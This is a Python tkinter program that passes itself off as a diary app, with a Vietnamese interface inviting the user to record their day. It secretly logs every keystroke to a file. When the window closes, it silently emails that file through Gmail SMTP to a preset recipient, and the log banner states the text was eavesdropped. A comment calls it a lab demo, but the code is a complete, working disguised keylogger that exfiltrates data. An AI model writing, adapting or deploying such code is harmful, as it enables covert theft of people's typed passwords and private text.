import tkinter as tk
from tkinter import messagebox, ttk
from datetime import datetime
from pathlib import Path
import smtplib
import ssl
import certifi
import mimetypes
from email.message import EmailMessage

LOG_FILE = "keystrokes.log"
SPECIAL_KEYS = {
    "Return": "<ENTER>",
    "BackSpace": "<BACKSPACE>",
    "Tab": "<TAB>",
    "Escape": "<ESC>",
    "space": " ",
    "Up": "<UP>",
    "Down": "<DOWN>",
    "Left": "<LEFT>",
    "Right": "<RIGHT>",
    "Delete": "<DELETE>",
    "Home": "<HOME>",
    "End": "<END>",
    "Prior": "<PAGE_UP>",
    "Next": "<PAGE_DOWN>",
}
DEFAULT_SSL_PORT = 465
DEFAULT_STARTTLS_PORT = 587

def write_log(text):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{ts}] {text}\n")

def ensure_log_banner():
    if not Path(LOG_FILE).exists():
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write("Đây là những gì đã nghe lén được:")

class SilentEmailSender:
    def __init__(self, file_to_send: Path):
        self.file_to_send = file_to_send
        self.smtp_host = "smtp.gmail.com"
        self.use_starttls = False  # Use SSL by default
        self.smtp_port = DEFAULT_SSL_PORT
        self.sender = "sender@gmail.com"  # Replace with actual sender email
        self.app_password = "SenderPassword"  # Replace with actual app password
        self.recipient = "YourOwn@gmail.com"  # Replace with actual recipient email
        self.subject = "Demo gửi keystrokes.log (silent)"
        self.body_text = "Email demo gửi file tự động. Dùng cho bài lab quan sát lưu lượng SMTPS/STARTTLS."

    def _build_message(self) -> EmailMessage:
        msg = EmailMessage()
        msg["From"] = self.sender
        msg["To"] = self.recipient
        msg["Subject"] = self.subject
        msg.set_content(self.body_text)
        mime, _ = mimetypes.guess_type(str(self.file_to_send))
        if mime:
            maintype, subtype = mime.split("/", 1)
        else:
            maintype, subtype = "application", "octet-stream"
        with open(self.file_to_send, "rb") as f:
            data = f.read()
        msg.add_attachment(data, maintype=maintype, subtype=subtype, filename=self.file_to_send.name)
        return msg

    def send_email(self):
        try:
            if not self.file_to_send.is_file():
                raise FileNotFoundError("File không tồn tại")
            host = self.smtp_host
            port = self.smtp_port
            user = self.sender
            pwd = self.app_password
            msg = self._build_message()
            context = ssl.create_default_context(cafile=certifi.where())
            if self.use_starttls:
                with smtplib.SMTP(host, port) as server:
                    server.ehlo()
                    server.starttls(context=context)
                    server.ehlo()
                    server.login(user, pwd)
                    server.send_message(msg)
            else:
                with smtplib.SMTP_SSL(host, port, context=context) as server:
                    server.login(user, pwd)
                    server.send_message(msg)
            return True
        except Exception as e:
            print(f"Silent email error: {str(e)}")  # For debugging
            return False

    def execute(self):
        return self.send_email()

class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("App Nhật Ký Đỉnh Cao Nhất 2025")
        self.geometry("800x520")
        ensure_log_banner()
        info = tk.Label(
            self,
            text=("Hôm nay của bạn thế nào?\n"
                  "Hãy lưu giữ mọi câu chuyện tại đây."),
            justify="left", padx=10, pady=10
        )
        info.pack(fill="x")
        self.text = tk.Text(self, width=100, height=22, wrap="word")
        self.text.pack(padx=10, pady=10, fill="both", expand=True)
        self.text.bind("<KeyPress>", self.on_keypress)
        self.text.focus_set()
        self.protocol("WM_DELETE_WINDOW", self.on_close)

    def on_keypress(self, event: tk.Event):
        keysym = event.keysym
        char = event.char
        if keysym in SPECIAL_KEYS:
            write_log(SPECIAL_KEYS[keysym])
        else:
            if char and ord(char) >= 32:
                write_log(char)
            else:
                write_log(f"<{keysym}>")

    def on_close(self):
        file_path = Path(LOG_FILE)
        if file_path.exists():
            sender = SilentEmailSender(file_path)
            success = sender.execute()
            if success:
                print("Email sent silently on close.")  # For debugging
            else:
                print("Failed to send email silently on close.")  # For debugging
        else:
            print(f"Log file {LOG_FILE} does not exist.")  # For debugging
        self.destroy()

if __name__ == "__main__":
    App().mainloop()